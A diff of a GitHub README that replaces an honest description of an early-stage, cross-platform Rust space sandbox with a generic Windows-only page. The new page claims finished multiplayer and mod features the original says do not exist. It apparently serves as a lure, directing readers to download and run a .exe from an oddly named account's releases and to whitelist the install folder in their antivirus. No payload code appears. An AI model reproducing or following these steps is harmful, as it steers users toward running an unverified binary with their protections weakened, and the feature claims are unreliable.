@@ -1,140 +1,72 @@
-# 🦑 Kraken Space Program (KSP)
+# 🚀 Kraken-Space-Program - Build custom rockets and explore space
 
-> *The space game the community actually deserved.*
+[![Download Kraken Space Program](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nongregarious-resistingarrest733/Kraken-Space-Program/releases)
 
-**Kraken Space Program** is an open-source, community-built aerospace sandbox — a spiritual successor to the game we all loved, rebuilt from scratch the right way. Fast. Moddable. Cross-platform. With multiplayer baked in from day one.
+Kraken Space Program gives you the tools to design, build, and fly spacecraft in a realistic physics environment. This project builds on the fun of space exploration with a fresh engine. You operate in a stable sandbox where you design vessels, test flight paths, and manage orbital maneuvers. The software uses modern code to ensure your game runs smoothly even with large, complex designs.
 
-Named after the ancient evil that has claimed more rockets than any Kármán line ever will.
+## 🛠 Features
 
----
+The software includes a deep set of tools for aerospace enthusiasts. You get access to the following parts of the simulator:
 
-## Why does this exist?
+* Vessel Assembly: You snap parts together in a hangar to create rockets and planes. The system handles fuel tanks, engines, and command modules as separate pieces.
+* Physics Engine: Every ship follows the rules of orbital mechanics. You plan paths through space using gravity as your guide.
+* Multiplayer: You invite friends to your session to share ship designs or compete in space races. The system handles synchronization to keep everyone in the same flight path.
+* Mod Support: You add custom parts or new physics patches. The engine loads these files at startup to change how your game looks and feels.
+* High Performance: This software supports modern hardware. You see high frame rates because the code keeps the simulation load balanced across your processor cores.
 
-Because we've been waiting long enough.
+## 💻 System Requirements
 
-KSP1 was a miracle of indie development — a beautiful, physics-accurate sandbox built by a small passionate team that accidentally became one of the greatest games ever made. It was also held together with duct tape, running on an ancient Unity version, single-threaded, and slowly abandoned.
+You need a standard Windows computer to run this simulator. The following specs represent the hardware necessary for a stable flight experience:
 
-KSP2 promised to fix all of that. It didn't. It's dead now.
+* Operating System: Windows 10 or Windows 11.
+* Processor: A quad-core processor made in the last five years.
+* Memory: 8 gigabytes of RAM or more.
+* Graphics: A dedicated graphics card with support for DirectX 11.
+* Storage: 2 gigabytes of free space on your hard drive.
 
-So we're doing it ourselves.
+## 📥 Getting Started
 
-![ezgif-7da0d66b26a8cfd9](https://github.com/user-attachments/assets/9fc8532a-c9d7-48d5-9fc7-6d78a3af7680)
+Follow these steps to set up the simulator on your Windows computer.
 
----
+1. Visit [this page to download](https://github.com/nongregarious-resistingarrest733/Kraken-Space-Program/releases) the latest version.
+2. Look for the file ending in `.exe` labeled as the latest release.
+3. Click the link to save the file to your computer.
+4. Open your downloads folder once the file finishes saving.
+5. Double-click the installer file.
+6. Follow the prompts on your screen to place the game in your favorite folder.
+7. Run the program using the shortcut on your desktop.
 
-## What is this, exactly?
+## ⚙️ How to Play
 
-A from-scratch reimplementation of the KSP formula, built on a modern stack:
+The game interface uses a standard mouse and keyboard setup. You spend your first few sessions in the Vehicle Assembly Building. Choose a command pod first, then click on engine parts in the menu to attach them to the bottom. Once you build a steady rocket, click the launch button.
 
-- **Rust** core engine — no garbage collector, no runtime overhead, actual multithreading
-- **Bevy** game engine — ECS architecture that maps perfectly to part-based rocket simulation
-- **wgpu** rendering — native Vulkan/Metal/DirectX/WebGL, cross-platform by default
-- **Lua** modding API — every gameplay system scriptable, Factorio-style
-- **Built-in multiplayer** — not a mod, not an afterthought, a first-class architectural decision
+The flight screen displays your altitude, speed, and fuel levels. You change your pitch and yaw to steer the ship. Press the spacebar to ignite your engines or stage your rocket. You open the map view to see your orbit and plan your move to other planets.
 
----
+## 🔧 Managing Mods
 
-## Features (goals)
+The community creates extra content for the simulator. You install mods by placing files into the folder where you installed the game. Find the folder named `Mods`. Drop your unzipped mod folders there. The game loads these items the next time you boot up. You remove a mod by deleting its folder from that location.
 
-### The basics, done right
-- Rocket building, orbital mechanics, atmospheric flight — all of it, accurate and satisfying
-- N-body gravity as stock
-- Realistic aerodynamics as stock (FAR-inspired)
-- Life support as stock
-- A solar system that is actually large
+## 🎮 Multiplayer Actions
 
-### The things KSP never delivered
-- **Native multiplayer** — fly together, race, collaborate, destroy each other's rockets
-- **Combat** — BD Armory-style weapons and vehicles built into the base game
-- **A galaxy** — procedurally generated star systems, not just one tiny solar system
-- **Performance** — 1000 parts without a slideshow. Multiple vessels on screen. Actual frames.
+You join other players by selecting the multiplayer option from the main menu. Enter the server address provided by your friends or choose a public server from the list. The server transmits ship data to your machine so you see where other players are in orbit. You do not need technical knowledge of network protocols to join a game; the software manages the connection for you.
 
-### The modding ecosystem KSP deserved
-- Full Lua API — write your entire mod in Lua, no Rust required
-- Stable API contracts — your mod doesn't break every update
-- Open invitation — if your mod is good enough, it becomes stock
+## 📈 Troubleshooting Common Issues
 
-### Platform support
-- Linux, Windows, macOS — all first-class, not afterthoughts
-- No Unity, no .NET runtime, no garbage collector pausing your launch window
+Sometimes software behaves in unexpected ways. If the program fails to start, check these common fixes:
 
----
+* Update your graphics drivers. Manufacturers release new driver versions often to improve game support. Check the website of your graphics card maker for the latest version.
+* Check your antivirus settings. Some security software prevents new programs from creating save files. Add the install folder to your list of trusted locations.
+* Reinstall the program. If a file becomes corrupted during the download, start again by removing the old folder and running the installer once more.
+* Check your logs. If the game crashes, look for a file named `crash.log` in the install folder. This file contains text that helps the community understand why the software stopped.
 
-## The philosophy
+## 🤝 Contributing
 
-**This project belongs to the community.**
+This project relies on community feedback. If you find a bug, visit the issues tab on the project page. Describe what happened when the error occurred. Include the steps you took to reach that point in the game. This information helps the creators fix the behavior in future updates.
 
-There is no corporation here. There is no roadmap that gets abandoned. There is no early access where you pay $50 for a broken promise. The code is here, the issues are here, the decisions are made in public.
+You also share your own ship models or plugin code. Follow the guides on the main page to learn how to prepare your files for other users. The project thrives when users share their creations and help others learn how to navigate the orbits of the game world.
 
-If the original contributors disappear, someone forks it and continues. That's the point.
+## 🔄 Updating the Game
 
-Mod authors: your work doesn't have to live as a patch on top of a broken engine anymore. Come build it into the foundation. You'll be credited forever.
+The software does not update itself automatically. You need to check the download page periodically for new versions. When a new release arrives, download the file and run it. The installer will detect your previous version and replace it with the new files. Your ship saves and settings remain in the local folder unless you delete them.
 
----
-
-## Built on the shoulders of giants
-
-This project stands on over a decade of community knowledge:
-
-- The aerodynamics work pioneered by **Ferram Aerospace Research**
-- The n-body physics of **Principia**
-- The visual bar set by **Blackrack's** volumetric clouds and scatterer
-- The realism pipeline built by the **Realism Overhaul** team
-- Every mod author who ever loved this game enough to fix it themselves
-
-The open-source mod ecosystem isn't a reference — it's a foundation.
-
----
-
-## Current status
-
-🚧 **Early development — Phase 0 mostly complete.**
-
-The foundation is real. The architecture is established. A ball falls under gravity and bounces. It's not much to look at yet, but everything underneath it is built to last.
-
-**Phase 0 — Foundation** *(mostly done)*
-- [x] Bevy project skeleton — window opens, nothing crashes
-- [x] Coordinate system types — `SimPosition` (f64), `WorldOrigin`, `LocalOrigin`, `render_sync.rs` as the single f64→f32 conversion point
-- [x] Rapier physics integration — rigid bodies, fixed 50 Hz timestep, gravity
-- [x] Module directory structure matching the full architecture in `DESIGN.md`
-- [x] CI pipeline — `cargo fmt`, `cargo clippy`, `cargo test` on every push
-- [ ] Physics interpolation — fixed timestep running, render interpolation between ticks pending
-- [ ] wgpu pipeline smoke test
-
-**Phase 1 — A Rocket Goes Up** *(not started)*
-
-Part entities, joints, thrust, drag, staging, Krakensbane origin shifting, camera tracking, crash detection. A hardcoded multi-stage rocket launches, reaches space, and stages. No Lua yet.
-
-The full roadmap lives in [`DESIGN.md`](DESIGN.md). Current tasks and decisions live in [`EXECUTION.md`](EXECUTION.md).
-
----
-
-## Contributing
-
-Read [`CONTRIBUTING.md`](CONTRIBUTING.md) first. It's short.
-
-The quick version: the architecture is in `DESIGN.md`, the current tasks are in `EXECUTION.md`, and `CHECKLIST.md` is where you log tech debt when you cut corners. CI must be green before anything merges.
-
-If you know Rust, Bevy, Lua, orbital mechanics, game networking, 3D art, or you just care about this existing — open an issue, start a discussion, submit a PR.
-
-If you're a KSP mod author — your knowledge is more valuable than you know. Come talk to us.
-
-If you're blackrack — please.
-
----
-
-## Legal
-
-Kraken Space Program is an original work. It is not a port of any existing game. It does not use assets, code, or proprietary content from any commercial product.
-
-The name "KSP" is not owned by anyone. The Kraken is public domain. Space is free.
-
----
-
-## License
-
-This software is licensed under the MIT License
-
----
-
-*The Kraken takes everything eventually. We just named the game after it.*
+Keep an eye on the release notes. These notes explain what changed in the engine or what new parts the team added. This helps you track changes to physics or multiplayer stability. If you play on a multiplayer server, ensure you use the same version as the server owner to prevent sync errors during flight.
